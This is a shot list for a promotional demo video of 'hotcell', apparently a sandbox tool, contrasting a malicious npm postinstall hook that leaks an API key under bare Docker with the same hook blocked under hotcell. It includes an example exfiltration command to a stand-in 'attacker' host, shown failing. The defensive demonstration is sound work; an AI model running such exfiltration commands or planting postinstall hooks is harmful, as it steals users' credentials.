# Video shot list — 60–90s, no narration, two panes

Real terminals. asciinema → agg → ffmpeg, or a clean screen capture. No motion
graphics, no music. Captions are plain text overlays. The refused-instantly
behavior films better than a hang — keep it.

**Everything shown is reproduced verbatim from `evidence/`. Nothing is staged.**

## Layout

```
┌───────────────────────────────┬───────────────────────────────┐
│  BARE DOCKER                  │  HOTCELL                      │
│  (how it's run today)         │  (npm install -g hotcell)     │
│                               │                               │
│   [terminal]                  │   [terminal]                  │
├───────────────────────────────┴───────────────────────────────┤
│  ATTACKER'S SERVER (a machine that isn't yours)  KEYS: 0 → ?  │
└───────────────────────────────────────────────────────────────┘
```

Bottom strip = the attacker's collector, live count.

## Beats (synchronized panes)

| t | LEFT — bare Docker | RIGHT — hotcell | Bottom (attacker) |
|---|---|---|---|
| 0–6s | caption: "Same agent. Same attack. Two sandboxes." | (same) | KEYS CAPTURED: 0 |
| 6–15s | `echo $OPENROUTER_API_KEY` → `sk-or-v1-…` (a real key) | `echo $OPENROUTER_API_KEY` → `hc-2c64e899…` (a token) | 0 |
| 15–30s | `npm install acme-analytics` — a dependency's postinstall exfiltrates | same command, same dependency | — |
| 30–45s | postinstall: `exfil SENT` | postinstall: connection **refused / no route** | LEFT flips → **KEYS CAPTURED: 1**, canary visible; RIGHT adds nothing |
| 45–60s | freeze. 🔑 **LEAKED** | freeze. 🔒 **keys leaked: 0** | LEFT: 1  ·  RIGHT: 0 |
| 60–70s | end card | end card | — |

End card (full frame):
```
There was nothing to steal — and it couldn't leave anyway.

npm install -g hotcell        hotcell.sh
Apache-2.0 · self-hosted · the key never enters the sandbox
```

## Optional 5s kicker (macOS microVM)

After the end card, a single terminal:
```
$ hotcell exec <vm> 'ip link'
1: lo: <LOOPBACK,UP> …          ← the only interface
$ hotcell exec <vm> 'curl http://attacker/steal'
curl: (7) Network unreachable   ← there is no network card
```
Caption: "On a microVM, the exfil isn't blocked. It's impossible."

## Source material (already captured)

- Left/right leak-vs-block: `evidence/vector2-dependency/raw-run.txt`
- Kicker: `evidence/macos-vz/raw-run.txt`

## Production notes

- Use the malicious-dependency vector for the main two panes: it is 100%
  deterministic, so every take is identical and a reproducer gets the same result.
- Canary key on the left, token on the right — never a live key.
- Keep total ≤ 90s. The single strongest second is the bottom strip flipping to
  `1` on the left while staying `0` on the right.
